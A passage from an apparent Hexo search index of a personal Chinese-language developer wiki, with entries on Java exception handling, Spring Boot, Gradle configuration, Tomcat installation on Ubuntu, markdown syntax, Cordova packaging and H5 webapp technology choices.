class="params">()</span> </span>&#123;</span><br><span class="line">    BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(</span><br><span class="line">                    <span class="keyword">new</span> FileInputStream(<span class="string">"file"</span>)));</span><br><span class="line">            <span class="comment">// do some other work</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// close reader</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            reader.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="异常链"><a href="#异常链" class="headerlink" title="异常链"></a>异常链</h4><p>丢出新的异常时避免丢失旧的异常,需要把旧的异常放入新的异常链中</p><p>c.initCause(e);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NeverCaught</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="keyword">throws</span> ExceptionB</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ExceptionB(<span class="string">"exception b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> <span class="keyword">throws</span> ExceptionC </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExceptionB e) &#123;</span><br><span class="line">            ExceptionC c = <span class="keyword">new</span> ExceptionC(<span class="string">"exception a"</span>);</span><br><span class="line">            <span class="comment">//异常连</span></span><br><span class="line">            c.initCause(e);</span><br><span class="line">            <span class="keyword">throw</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                g();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionC e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">exception.ExceptionC</span></span><br><span class="line"><span class="comment">at exception.NeverCaught.g(NeverCaught.java:12)</span></span><br><span class="line"><span class="comment">at exception.NeverCaught.main(NeverCaught.java:21)</span></span><br><span class="line"><span class="comment">Caused by: exception.ExceptionB</span></span><br><span class="line"><span class="comment">at exception.NeverCaught.f(NeverCaught.java:5)</span></span><br><span class="line"><span class="comment">at exception.NeverCaught.g(NeverCaught.java:10)</span></span><br><span class="line"><span class="comment">... 1 more</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="运行时异常和检查异常"><a href="#运行时异常和检查异常" class="headerlink" title="运行时异常和检查异常"></a>运行时异常和检查异常</h4><p>检查异常:编译时期比如处理的异常,比如FileNotFoundException,<br>比如使用try catch捕获。</p><p>运行时异常:可以不用处理,最终jvm会处理的异常。比如NullPointerException</p><h4 id="throw、throws"><a href="#throw、throws" class="headerlink" title="throw、throws"></a>throw、throws</h4><p>throws: 当我们遇到检查异常时,如果不想在方法内处理,可以加上throws关键字,然上一级方法调用者<br>检查,throws会抛出所有检查异常。</p><p>throw:在方法内部抛出一个异常。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 学习指南</title>
      <link href="/Java/java/Spring%20boot%20Basic/"/>
      <url>/Java/java/Spring%20boot%20Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Spring-boot"><a href="#什么是Spring-boot" class="headerlink" title="什么是Spring boot"></a>什么是Spring boot</h2><p>Spring boot是一个基于Spring、Spring MVC的开发框架，特点是约定大于配置，使用Jar和内嵌容器的方式运行。</p><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>Spring boot原理：<a href="http://blog.csdn.net/liaokailin/article/category/5765237" target="_blank" rel="noopener">http://blog.csdn.net/liaokailin/article/category/5765237</a></li></ul><h2 id="Spring-boot原理的个人理解"><a href="#Spring-boot原理的个人理解" class="headerlink" title="Spring boot原理的个人理解"></a>Spring boot原理的个人理解</h2><ul><li>内嵌Tomcat，使用JAR包部署，和一般java应用一致，不再使用web容器的方式编写代码</li><li>在使用Spring boot中非常不解的一件事是为什么可以直接引入包就可以使用，因为Spring boot有自动化配置的方式，常用的配置被定义在在autoconfigure这个包下，可以使用@Config注解来覆盖</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java CMS 选型</title>
      <link href="/java/java/cms%20in%20java/"/>
      <url>/java/java/cms%20in%20java/</url>
      
        <content type="html"><![CDATA[<h2 id="技术要求"><a href="#技术要求" class="headerlink" title="技术要求"></a>技术要求</h2><p>SpringMVC+Mybatis+freemarker/JSP</p><h2 id="通用后台快速开发方案"><a href="#通用后台快速开发方案" class="headerlink" title="通用后台快速开发方案"></a>通用后台快速开发方案</h2><ul><li><a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></li><li><a href="https://github.com/kanwangzjm/funiture" target="_blank" rel="noopener">https://github.com/kanwangzjm/funiture</a></li></ul><h2 id="成品CMS方案"><a href="#成品CMS方案" class="headerlink" title="成品CMS方案"></a>成品CMS方案</h2><ul><li><a href="http://www.tjpcms.com" target="_blank" rel="noopener">http://www.tjpcms.com</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Gradle 使用基础</title>
      <link href="/java/java/Gradle%20basic/"/>
      <url>/java/java/Gradle%20basic/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Gradle 是一个打包工具和Maven一样能构建java项目。和前端类比的打包工具是Grunt等</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理<code></code></h2><p>Gradle创建的工程由 Project和Tasks，Gradle所有的任务都是通过引入插件和编写task来实现的</p><h2 id="常用配置"><a href="#常用配置" class="headerlink" title="常用配置"></a>常用配置</h2><p>`</p><p>buildscript {<br>    ext {<br>        springBootVersion = ‘1.5.6.RELEASE’<br>    }<br>    repositories {<br>        mavenCentral()<br>    }<br>    dependencies {<br>        classpath(“org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}”)<br>    }<br>}</p><p>apply plugin: ‘java’<br>apply plugin: ‘eclipse’<br>apply plugin: ‘org.springframework.boot’</p><p>version = ‘0.0.1-SNAPSHOT’<br>sourceCompatibility = 1.8</p><p>repositories {<br>    mavenCentral()<br>}</p><p>dependencies {</p><pre><code>compile(&apos;org.springframework.boot:spring-boot-starter-web&apos;)compile group: &apos;org.springframework.boot&apos;, name: &apos;spring-boot-starter-data-jpa&apos;, version: &apos;1.5.3.RELEASE&apos;compile group: &apos;javax.servlet.jsp.jstl&apos;, name: &apos;javax.servlet.jsp.jstl-api&apos;, version: &apos;1.2.1&apos;compile group: &apos;org.apache.tomcat.embed&apos;, name: &apos;tomcat-embed-jasper&apos;, version: &apos;9.0.0.M25&apos;compile group: &apos;javax.servlet&apos;, name: &apos;jstl&apos;, version: &apos;1.2&apos;compile group: &apos;org.glassfish&apos;, name: &apos;javax.el&apos;, version: &apos;3.0.0&apos;compile group: &apos;org.apache.commons&apos;, name: &apos;commons-lang3&apos;, version: &apos;3.0&apos;runtime(&apos;mysql:mysql-connector-java&apos;)testCompile(&apos;org.springframework.boot:spring-boot-starter-test&apos;)</code></pre><p>}</p><p>`</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>查看所有的任务列表</p><blockquote><p>gradle tasks –all</p></blockquote><p>生成 wrapper </p><blockquote><p>gradle wrapper</p></blockquote><p><a href="https://docs.gradle.org/current/userguide/gradle_wrapper.html" target="_blank" rel="noopener">https://docs.gradle.org/current/userguide/gradle_wrapper.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 学习教程资源收集</title>
      <link href="/java/java/Java%20tutorial%20collection/"/>
      <url>/java/java/Java%20tutorial%20collection/</url>
      
        <content type="html"><![CDATA[<h3 id="教程列表"><a href="#教程列表" class="headerlink" title="教程列表"></a>教程列表</h3><p>下列顺序可以作为学习路线图</p><ul><li>入门教程 <a href="http://www.runoob.com/java/java-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-tutorial.html</a></li><li>Servlet <a href="http://www.runoob.com/servlet/servlet-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/servlet/servlet-tutorial.html</a></li><li>JSP <a href="http://www.runoob.com/jsp/jsp-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/jsp/jsp-tutorial.html</a></li><li>Spring mvc<ul><li>张开涛 <a href="http://jinnianshilongnian.iteye.com/category/231099" target="_blank" rel="noopener">http://jinnianshilongnian.iteye.com/category/231099</a></li><li>传智播客视屏教程</li></ul></li><li><p>Maven <a href="https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p></li><li><p>Mybatis</p></li><li>Hibernate</li></ul><h3 id="其他资料收集"><a href="#其他资料收集" class="headerlink" title="其他资料收集"></a>其他资料收集</h3><ul><li>一些Java基础例子 <a href="http://www.runoob.com/java/java-examples.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-examples.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web工程师知识图谱</title>
      <link href="/java/java/Java%20kills%20map/"/>
      <url>/java/java/Java%20kills%20map/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Java基础</p></li><li><p>Web开发基础知识</p><ul><li>浏览器工作原理</li><li>Servlet和JSP</li><li>HTTP协议</li><li>DNS解析原理</li><li>HTML、CSS、JS</li></ul></li><li><p>Java框架</p><ul><li>Spring、Spring MVC</li><li>Mybatis</li><li>Hibernate</li><li>Shiro\Spring security</li><li>Spring boot</li><li>JWT token认证方案</li></ul></li><li><p>常用library</p><ul><li>Google guava集合处理和常用工具</li><li>Apache commons api</li><li>Quartz计划任务处理</li><li>Jackson json处理</li><li>Selflog 日志生成</li><li>freemarker模板引擎</li><li>Apache httpcomponent HTTP client工具</li></ul></li><li><p>数据库</p><ul><li>Mysql</li><li>MongoDB</li><li>Redis</li></ul></li><li><p>架构设计</p><ul><li>OAuth</li><li>Restful API设计</li><li>SSO单点登录</li><li>分布式框架Dubbo</li><li>微服务框架Spring cloud</li></ul></li><li><p>工程化</p><ul><li>Gradle\Maven构建工具</li><li>Jenkins</li><li>Circleci PaaS平台的CI</li><li>Checkstyle代码质量检测</li><li>FindBugs代码检测</li><li>Swagger文档管理</li><li>Axway webgate网关方案</li></ul></li><li><p>测试</p><ul><li>Contract 测试Pact</li><li>Junit</li><li>Assertj断言库</li><li>mockito 单元测试Mock工具</li><li>WireMock数据拦截和模拟</li></ul></li><li><p>部署和监控</p><ul><li>Linux</li><li>Tomcat web服务器</li><li>Nginx负载均衡</li><li>Splunk日志管理</li><li>Dynatrace</li><li>ELK(ElasticSearch+Logstash+ Kibana)</li><li>Spring boot admin监控</li></ul></li><li><p>项目管理</p><ul><li>禅道管理平台</li><li>Trello看板管理</li><li>Confluence文档管理</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>在Ubuntu上通过apt-get搭建tomcat</title>
      <link href="/java/java/Java%20environment%20in%20linux/"/>
      <url>/java/java/Java%20environment%20in%20linux/</url>
      
        <content type="html"><![CDATA[<p>参考博客：<a href="https://www.digitalocean.com/community/tutorials/how-to-install-apache-tomcat-7-on-ubuntu-14-04-via-apt-get" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-install-apache-tomcat-7-on-ubuntu-14-04-via-apt-get</a><br>翻译版：<a href="http://www.linfuyan.com/how-to-install-apache-tomcat7-on-ubuntu-14-04-via-apt-get/" target="_blank" rel="noopener">http://www.linfuyan.com/how-to-install-apache-tomcat7-on-ubuntu-14-04-via-apt-get/</a></p><h2 id="关于-Apache-Tomcat"><a href="#关于-Apache-Tomcat" class="headerlink" title="关于 Apache Tomcat"></a>关于 Apache Tomcat</h2><p>Apache Tomcat 是一个服务器应用，通常用来部署 Java 应用到 Web 。 Tomcat 是 Java Servlet 与 JSP 技术的一个开源实现，由 Apache 软件基金会发布。</p><p>这个教程涵盖了在 Ubuntu 14.04 上 Tomcat 7.0.x 版本的安装和基础配置。</p><p>有两种基本的途径来安装 Tomcat 到 Ubuntu 上：</p><p>通过 apt-get 工具来安装，这是最简单的方法。<br>从 Apache Tomcat 网站下载二进制发布包。本教程不涵盖这种方法。<br>在这个教程中，我们将使用最简单地方法： apt-get 。这将从官方的 Ubuntu 资源仓库安装最新的 Tomcat 发布包，这个包可能不是 Tomcat 的最新发布版本。如果你想要确保安装 Tomcat 的最新版，你可以下载最新的二进制发布包。</p><h2 id="步骤一-先决条件"><a href="#步骤一-先决条件" class="headerlink" title="步骤一 - 先决条件"></a>步骤一 - 先决条件</h2><p>在你开始这个向导之前，在你的服务器上需要配置一个独立的非 root 用户账号。你可以按照 Ubuntu 14.04 上搭建服务器中的 1-4 步来学习完成它。我们这里使用创建的 demo 用户来完成后续的教程。</p><h2 id="步骤二-安装-Tomcat"><a href="#步骤二-安装-Tomcat" class="headerlink" title="步骤二 - 安装 Tomcat"></a>步骤二 - 安装 Tomcat</h2><p>首先，你需要升级 apt-get 软件包列表：</p><blockquote><p>sudo apt-get update</p></blockquote><p>现在你已经准备好安装 Tomcat。运行以下命令，开始安装：</p><blockquote><p>sudo apt-get install tomcat7</p></blockquote><p>输入 yes 来安装 Tomcat 。这将同时安装 Tomcat 和它的依赖，例如 Java，同时，它将创建一个 tomcat7 用户，并以默认设置启动 Tomcat 。</p><p>这时候， Tomcat 并没有完全安装完成，但你可以通过在浏览器中输入本地域名或IP地址之后加 :8080 的方法来访问默认页面。</p><blockquote><p><a href="http://your_ip_address:8080" target="_blank" rel="noopener">http://your_ip_address:8080</a><br>你会看到一个闪屏页面，显示 “It works” ，和其他附加信息。现在，我们要深入到 Tomcat 的安装过程。</p></blockquote><h2 id="步骤三-安装额外软件包"><a href="#步骤三-安装额外软件包" class="headerlink" title="步骤三 - 安装额外软件包"></a>步骤三 - 安装额外软件包</h2><p>注意：如果你对 Tomcat 足够了解，且不需要 Web 管理接口，文档和示例，那这个章节不是必须的。如果你是第一次接触 Tomcat ，请继续。</p><p>通过以下代码，你将安装 Tomcat 的在线文档， Web接 口（管理 Web 应用），以及一些示例应用。</p><blockquote><p>sudo apt-get install tomcat7-docs tomcat7-admin tomcat7-examples</p></blockquote><h2 id="步骤四-配置-Tomcat-Web-管理器"><a href="#步骤四-配置-Tomcat-Web-管理器" class="headerlink" title="步骤四 - 配置 Tomcat Web 管理器"></a>步骤四 - 配置 Tomcat Web 管理器</h2><p>想要使用步骤三中安装的 Web 应用管理器，需要先登录到 Tomcat 服务器。首先需要编辑修改 tomcat-users.xml ：</p><blockquote><p>sudo nano /etc/tomcat7/tomcat-users.xml<br>该文件充满了用于说明如何配置的注释。你需要删除下面两行之间的所有注释。如需要用作参考，则保留。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure><p>你需要添加一个用户，可以访问 manager-gui 和 admin-gui （我们在步骤三种安装的管理界面）。你可以通过如下的配置来定义一个用户。如果需要，确保修改用户名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;password&quot; roles=&quot;manager-gui,admin-gui&quot; /&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure></p><p>保存并退出 tomcat-users.xml 文件。重启 Tomcat 服务，以便修改配置生效。</p><blockquote><p>sudo service tomcat7 restart</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用Java构建API的知识体系</title>
      <link href="/java/java/Java%20api%20tech%20map/"/>
      <url>/java/java/Java%20api%20tech%20map/</url>
      
        <content type="html"><![CDATA[<ul><li>API基本概念及资源的定义</li><li>RESTful架构风格与成熟度模型</li><li>规范化接口定义与设计</li><li>JSON API Spec</li><li>初始化项目环境并启动一个API Demo</li><li>用Spring Boot快速构建项目</li><li>Swagger UI对API文档化</li><li>搭建多个不同业务的APIs</li><li>API升级及版本控制策略</li><li>API的认证与授权（常用的API认证方法及安全问题）</li><li>Axway网关集成及流量控制</li><li>服务负载均衡ELB/F5</li><li>Hyxtrix故障熔断器，阻止故障雪崩</li><li>API中使用RxJava进行响应式编程</li><li>最佳实践及总结</li><li>日志监控与错误追踪</li><li>调用链跟踪和性能面板</li><li>Dynatrace &amp; Zipkin</li><li>AH Portal &amp; Splunk</li><li>什么是消费者契约测试？</li><li>契约测试工具Pact的使用</li><li>Spring Cloud Contract的使用？</li><li>API测试工具的使用（SoapUI/Postman/自动化测试）</li><li>Spring Cloud 理念</li><li>配置服务器应用</li><li>API服务注册与发现</li><li>GraphQL?</li><li>遗留系统向微服务架构迁移</li><li>最佳实践</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 app开发经验</title>
      <link href="/h5/h5/h5%20app/"/>
      <url>/h5/h5/h5%20app/</url>
      
        <content type="html"><![CDATA[<p>安装打包后的IPA文件到手机：<a href="http://blog.csdn.net/Qyee16/article/details/68083242" target="_blank" rel="noopener">http://blog.csdn.net/Qyee16/article/details/68083242</a><br>申请APP证书：<a href="https://www.jianshu.com/p/665c1d67adde" target="_blank" rel="noopener">https://www.jianshu.com/p/665c1d67adde</a></p>]]></content>
      
      
      <categories>
          
          <category> h5 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>How to use this wiki!</title>
      <link href="/help/how-to-use-this-wiki/"/>
      <url>/help/how-to-use-this-wiki/</url>
      
        <content type="html"><![CDATA[<p>Welcome to ! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="about-hexo"><a href="#about-hexo" class="headerlink" title="about hexo"></a>about hexo</h2><p>本wiki的思路为使用github作为文档、代码的版本管理,使用hexo来生成静态网站。摒弃了博客的写作方式,使用了markdown和wiki的方式,<br>从首页的导航链接直接进入所有的文档,配合搜索框一部了然,用于建立一个知识地图,因此能快速的编写和寻找需要的资料。</p><p>##更多资料</p><p><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a><br><a href="https://github.com" target="_blank" rel="noopener">Github</a></p><h2 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h2><h2 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a>图片插件</h2><p>创建文章同名目录,然后放置图片或者其他资源即可使用相对路径访问</p><p><img src="/help/how-to-use-this-wiki/05a4c81a-8793-4baa-92a1-94b28aece873.jpg" alt=""></p><p><a href="hello-world.md">测试连接</a></p><h2 id="常用markdown语法"><a href="#常用markdown语法" class="headerlink" title="常用markdown语法"></a>常用markdown语法</h2><p>标题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">##### 四级标题</span><br><span class="line">###### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><p>列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Red</span><br><span class="line">- Green</span><br><span class="line">- Blue</span><br><span class="line"></span><br><span class="line">* Red</span><br><span class="line">* Green</span><br><span class="line">* Blue</span><br><span class="line"></span><br><span class="line">+ Red</span><br><span class="line">+ Green</span><br><span class="line">+ Blue</span><br></pre></td></tr></table></figure><p>引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 这是一个引用</span><br></pre></td></tr></table></figure><p>图片与链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图片：![]()    ![图片文本(可忽略)](图片地址)</span><br><span class="line"></span><br><span class="line">链接：[]()     [链接文本](链接地址)</span><br></pre></td></tr></table></figure><p>表格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|标题|标题|标题|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|居左测试文本|居中测试文本|居右测试文本|</span><br><span class="line">|居左测试文本1|居中测试文本2|居右测试文本3|</span><br><span class="line">|居左测试文本11|居中测试文本22|居右测试文本33|</span><br><span class="line">|居左测试文本111|居中测试文本222|居右测试文本333|</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> help </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 Cordova打包方案</title>
      <link href="/h5/h5/Build%20package%20with%20Apache%20Cordova/"/>
      <url>/h5/h5/Build%20package%20with%20Apache%20Cordova/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要H5打包？"><a href="#为什么需要H5打包？" class="headerlink" title="为什么需要H5打包？"></a>为什么需要H5打包？</h2><p>通过H5可以开发跨平台的APP，比如安卓、IOS.</p><h2 id="使用Cordova打包"><a href="#使用Cordova打包" class="headerlink" title="使用Cordova打包"></a>使用Cordova打包</h2><p>使用npm安装</p><blockquote><p>npm install -g cordova</p></blockquote><p>创建一个项目</p><blockquote><p>cordova create hello com.example.hello HelloWorld</p></blockquote><p>在这个项目下有一个www的目录，该目录就是放置我们的webapp的位置</p><p>然后我们可以添加需要编译的平台</p><blockquote><p>cordova platform add ios<br>cordova platform add android</p></blockquote><p>查看添加的平台</p><blockquote><p>cordova platform ls</p></blockquote><p>构建所有平台</p><blockquote><p>cordova build</p></blockquote><p>构建指定平台</p><blockquote><p>cordova build ios</p></blockquote><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://cordova.apache.org/docs/en/latest/guide/cli/" target="_blank" rel="noopener">https://cordova.apache.org/docs/en/latest/guide/cli/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> h5 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 webapp技术选型</title>
      <link href="/h5/h5/H5%20webapp%20tech%20stack/"/>
      <url>/h5/h5/H5%20webapp%20tech%20stack/</url>
      
        <content type="html"><![CDATA[<h3 id="VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案"><a href="#VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案" class="headerlink" title="VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)"></a>VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)</h3><ul><li>vuejs2.0</li><li>vue-router</li><li>vuex</li><li>mint-ui</li><li>Jest</li></ul><p>常用lib信息</p><table><thead><tr><th>包名</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td>Vue</td><td style="text-align:center">VUE视图</td></tr><tr><td>Vue-router</td><td style="text-align:center">路由</td></tr><tr><td>Typescript</td><td style="text-align:center">静态类型</td></tr><tr><td>vuex</td><td style="text-align:center">状态管理</td></tr><tr><td>mint-ui</td><td style="text-align:center">ui框架</td></tr><tr><td>Jest</td><td style="text-align:center">测试框架</td></tr><tr><td>axios</td><td style="text-align:center">HTTP库</td></tr><tr><td>immutable</td><td style="text-align:center">immutable 工具</td></tr><tr><td>moment</td><td style="text-align:center">时间处理库</td></tr><tr><td>vue-class-component</td><td style="text-align:center">vue 的面向对象形式</td></tr><tr><td>vue-property-decorator</td><td style="text-align:center">vue 装饰器</td></tr><tr><td>vuex-class</td><td style="text-align:center">vuex的面向对象形式</td></tr><tr><td>vconsole</td><td style="text-align:center">手机网页调试工具</td></tr></tbody></table><p>参考资料:</p><ul><li>vue官方脚手架 (支持 TS、Babel、Vuex、SASS): <a href="https://www.npmjs.com/package/vue-cli" target="_blank" rel="noopener">https://www.npmjs.com/package/vue-cli</a></li><li><a href="https://segmentfault.com/a/1190000013676663" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013676663</a> VUE + TS的项目搭建</li></ul><h3 id="HBuilder方案"><a href="#HBuilder方案" class="headerlink" title="HBuilder方案"></a>HBuilder方案</h3><ul><li>mui</li><li>Hbuilder</li></ul><p>成本低廉，开发方面，原生的webview API和切换性能也可<br>参考案例：<a href="https://github.com/linksgo2011/tinda_app_cordova/" target="_blank" rel="noopener">https://github.com/linksgo2011/tinda_app_cordova/</a></p><p>注意事项</p><ul><li>每个页面为一个独立的窗口</li><li>返回会有数据刷新问题</li><li>窗口内如果发生页面跳转，会造成路由不一致</li><li>尽量使用页面 + API的方式快速开发</li></ul><h3 id="React技术选型"><a href="#React技术选型" class="headerlink" title="React技术选型"></a>React技术选型</h3><ul><li>React</li><li>Redux </li><li>webpack</li></ul><p>参考案例</p><ul><li>cnode 客户端方案可以构建出web、mobile各种平台</li></ul><h3 id="Jquery技术方案"><a href="#Jquery技术方案" class="headerlink" title="Jquery技术方案"></a>Jquery技术方案</h3><ul><li>mui</li><li>zepto.js or jquery.js</li></ul><p>参考案例</p><ul><li>vue购物车 <a href="https://github.com/liu-zhuang/Vue-Demo" target="_blank" rel="noopener">https://github.com/liu-zhuang/Vue-Demo</a></li><li><a href="https://github.com/zoeminghong/shopping-cart-vue-project" target="_blank" rel="noopener">https://github.com/zoeminghong/shopping-cart-vue-project</a></li><li>音乐APP <a href="https://www.cnblogs.com/smartXiang/p/6055616.html" target="_blank" rel="noopener">https://www.cnblogs.com/smartXiang/p/6055616.html</a></li></ul><h2 id="打包方案"><a href="#打包方案" class="headerlink" title="打包方案"></a>打包方案</h2><p>使用cordova <a href="http://wiki.printf.cn/h5/h5/Build">http://wiki.printf.cn/h5/h5/Build</a> package with Apache Cordova</p>]]></content>
      
      
      <categories>
          
          <category> h5 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端生态图谱</title>
      <link href="/frontend/frontend/frontend%20ecologies/"/>
      <url>/frontend/frontend/frontend%20ecologies/</url>
      
